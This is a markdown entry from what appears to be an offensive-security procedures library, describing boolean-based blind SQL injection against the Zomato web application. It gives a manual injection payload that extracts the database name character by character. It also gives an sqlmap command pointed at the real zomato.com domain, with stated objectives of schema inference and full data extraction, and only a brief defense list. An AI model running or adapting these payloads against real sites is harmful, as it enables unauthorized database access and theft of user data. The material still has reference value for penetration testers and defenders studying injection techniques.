---
id: proc-sqli-boolean-craft-001
name: Craft-Boolean-SQL-Payloads
tags:
  - sqli
  - boolean-based
  - payload
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/manual-boolean-payload]]'
  - '[[commands/sqlmap-boolean-mode]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.112Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Boolean-SQL-Payloads

## Summary

This procedure details the creation of boolean-based SQL injection payloads to confirm and exploit vulnerabilities, as seen in the Zomato application, by forcing conditional responses that reveal database information without direct errors.

## Description

Boolean-based SQLi exploits applications where true/false conditions alter page content or behavior subtly. In the Zomato case, lack of input sanitization allowed such payloads to manipulate queries. This method is blind but effective for data inference, requiring iterative requests to guess data character by character. It assumes a confirmed injectable endpoint and targets MySQL-like databases.

## Requirements

1. Confirmed vulnerable URL from prior reconnaissance
2. Proxy tool (Burp Suite) for payload testing
3. sqlmap installed for automation

## Defense

Defensive measures and detection strategies:

- Enforce strict input validation and escaping for all user inputs
- Implement rate limiting on requests to detect iterative probing
- Log and alert on response time variations or unusual parameter patterns

## Objectives

1. Validate boolean injection by observing response differences
2. Infer database schema elements like table/column names
3. Prepare for full data extraction

## Instructions

### Step 1: Manual Payload Construction

**Context**: In Burp Repeater, craft payloads that use boolean functions to test conditions, such as substring matches.

**Command** ([[commands/manual-boolean-payload]]):
```bash
# Append to vulnerable parameter: ' AND (SELECT SUBSTRING((SELECT database()),1,1))='z' --
```

> If the response changes (e.g., content loads for true), the condition holds; iterate for each character position.

### Step 2: Automate with sqlmap

**Context**: Leverage sqlmap's boolean technique to handle payload generation and testing efficiently.

**Command** ([[commands/sqlmap-boolean-mode]]):
```bash
sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql --batch --threads=1
```

> Output will show payload success rates and inferred data, like database name "zomato_db".

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/manual-boolean-payload]]
- [[commands/sqlmap-boolean-mode]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/sqlmap]]

## Tags

- [[sqli]]
- [[boolean-based]]
- [[payload]]
